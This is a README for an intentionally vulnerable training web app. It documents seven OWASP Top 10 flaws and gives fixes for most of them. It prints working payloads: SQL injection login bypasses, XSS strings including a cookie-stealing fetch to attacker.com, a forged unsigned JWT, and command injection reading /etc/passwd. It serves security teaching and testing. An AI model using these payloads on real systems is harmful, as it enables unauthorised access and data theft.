# Security Testing Demo Project

> A vulnerable web application designed to demonstrate security testing skills and knowledge of OWASP Top 10 vulnerabilities.

## Disclaimer

**This application contains intentional security vulnerabilities for educational and demonstration purposes only!**
- DO NOT deploy this to production
- DO NOT use in any real-world application
- Only use in controlled, isolated environments

##  Purpose

This project showcases practical knowledge of:
- Identifying common web vulnerabilities
- Understanding security exploitation techniques
- Demonstrating penetration testing skills to potential employers
- OWASP Top 10 security risks

## Quick Start

### Prerequisites
- Node.js (v14 or higher)
- npm or yarn

### Installation

```bash
# Install dependencies
npm install

# Start the application
npm start

# For development with auto-reload
npm run dev
```

The application will be available at `http://localhost:3000`

## Automated Testing with Playwright

This project includes comprehensive Playwright test suites organized like OWASP Juice Shop.

### Test Structure

- **test/api/** - API endpoint tests for direct vulnerability validation
- **test/e2e/** - End-to-end browser tests for UI-based exploits

### Running Tests

```bash
# Install Playwright browsers (first time only)
npx playwright install

# Run all tests (API + E2E)
npm test

# Run only API tests
npm run test:api

# Run only E2E tests  
npm run test:e2e

# Run tests with UI mode (interactive)
npm run test:ui

# Run tests in headed mode (see browser)
npm run test:headed

# View test report
npm run test:report
```

### Test Coverage

**API Tests** (test/api/):
- SQL injection attacks on login and search endpoints
- IDOR user enumeration without authentication
- JWT forgery and weak token verification
- Configuration data exposure
- Mass assignment privilege escalation

**E2E Tests** (test/e2e/):
- Reflected XSS with multiple payloads
- SQL injection via UI forms
- Full exploit chains in browser context

### Why Playwright?

Unlike Juice Shop's Cypress + Frisby approach, Playwright provides:
- Single framework for both API and E2E testing
- Better performance and modern API
- Native TypeScript support
- Cross-browser testing capabilities

## Vulnerabilities Implemented

### 1. SQL Injection (OWASP A03)
**Location:** `/api/login` endpoint

**Vulnerability:** Direct string concatenation in SQL query without parameterization.

**Exploitation:**
```bash
# Bypass authentication
Username: admin' OR '1'='1'--
Password: anything

# Or using comment injection
Username: admin'--
Password: (leave empty)
```

**Impact:** Complete authentication bypass, unauthorized access to any account.

---

### 2. Cross-Site Scripting - XSS (OWASP A03)
**Location:** `/api/search` endpoint and search functionality

**Vulnerability:** Unsanitized user input reflected in HTML response.

**Exploitation:**
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag with error handler -->
<img src=x onerror=alert('XSS')>

<!-- Cookie theft (if cookies weren't httpOnly) -->
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

**Impact:** Session hijacking, credential theft, malicious redirects.

---

### 3. Insecure Direct Object Reference - IDOR (OWASP A01)
**Location:** `/api/user/:id` endpoint

**Vulnerability:** No authorization checks, any user can access other users' sensitive data.

**Exploitation:**
```bash
# Access user 1's data
GET /api/user/1

# Access user 2's data
GET /api/user/2

# Access admin data
GET /api/user/3
```

**Impact:** Unauthorized access to sensitive user information including secret_data field.

---

### 4. Broken Authentication (OWASP A07)
**Location:** `/api/admin` endpoint

**Vulnerability:** Weak JWT verification using `jwt.decode()` instead of `jwt.verify()`, accepts unsigned tokens.

**Exploitation:**
```javascript
// Create a token with "none" algorithm
const fakeToken = btoa(JSON.stringify({alg:"none"})) + '.' + 
                  btoa(JSON.stringify({role:"admin",username:"attacker"})) + '.';

// Use in request
fetch('/api/admin', {
  headers: { 'Authorization': 'Bearer ' + fakeToken }
});
```

**Impact:** Complete authentication bypass, unauthorized admin access.

---

### 5. Sensitive Data Exposure (OWASP A02)
**Location:** `/api/config` endpoint

**Vulnerability:** Exposes sensitive configuration data including secret keys and API credentials.

**Exploitation:**
```bash
# Simply visit the endpoint
GET /api/config

# Returns:
{
  "secret_key": "super-secret-key",
  "api_keys": {
    "stripe": "sk_test_fake_key",
    "aws": "AKIAIOSFODNN7EXAMPLE"
  }

```

**Impact:** Exposure of secrets enabling further attacks, data breaches.

---

### 6. Mass Assignment (OWASP A04)
**Location:** `/api/register` endpoint

**Vulnerability:** Accepts arbitrary user input without validation, allows role escalation.

**ExPlaywright** - Automated browser testing and vulnerability verification
- **ploitation:**
```bash
# Register as admin
POST /api/register
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123",
  "email": "hacker@evil.com",
  "role": "admin"
}
```

**Impact:** Privilege escalation, unauthorized admin access.

---

### 7. Command Injection (Simulated)
**Location:** `/api/ping` endpoint

**Vulnerability:** Unsanitized user input used in system commands.

**Exploitation:**
```bash
# Command chaining
GET /api/ping?host=localhost;cat /etc/passwd

# Or with pipes
GET /api/ping?host=localhost | whoami
```

**Impact:** Remote code execution, complete system compromise (in production scenario).

---

## Testing Tools

Recommended tools for testing these vulnerabilities:

- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Automated vulnerability scanning
- **SQLMap** - Automated SQL injection testing
- **Postman** - API endpoint testing
- **Browser DevTools** - XSS and client-side testing
- **JWT.io** - JWT token manipulation

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) (the inspiration)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

## Mitigation Strategies

For each vulnerability, here's how to fix it:

### SQL Injection
```javascript
// Use parameterized queries
db.get('SELECT * FROM users WHERE username = ? AND password = ?', 
  [username, password], callback);
```

### XSS
```javascript
// Sanitize output
const sanitized = escapeHtml(userInput);
// Use Content-Security-Policy headers
// Validate and encode all user input
```

### IDOR
```javascript
// Implement proper authorization
if (req.user.id !== requestedUserId && req.user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### Broken Authentication
```javascript
// Properly verify JWT tokens
jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
// Implement proper session management
```

### Sensitive Data Exposure
```javascript
// Never expose configuration endpoints
// Use environment variables
// Implement proper access controls
```

### Mass Assignment
```javascript
// Whitelist allowed fields
const allowedFields = ['username', 'password', 'email'];
const userData = pick(req.body, allowedFields);
userData.role = 'user'; // Set server-side
```

## Interview Talking Points

When presenting this project to HR/recruiters:

1. **Understanding:** Demonstrate deep knowledge of each vulnerability
2. **Exploitation:** Show how each can be exploited (ethically)
3. **Mitigation:** Explain proper fixes and security best practices
4. **Tools:** Discuss testing methodologies and tools used
5. **Impact:** Articulate business impact of each vulnerability
6. **Standards:** Reference OWASP Top 10 and industry standards

## License

MIT License - Feel free to use for educational purposes.

## About

Created as a portfolio project to demonstrate:
- Security testing expertise
- Full-stack development skills
- Understanding of web application vulnerabilities
- Practical penetration testing knowledge

**Remember:** This is for learning and demonstration only. Always practice ethical hacking and obtain proper authorization before testing any systems.
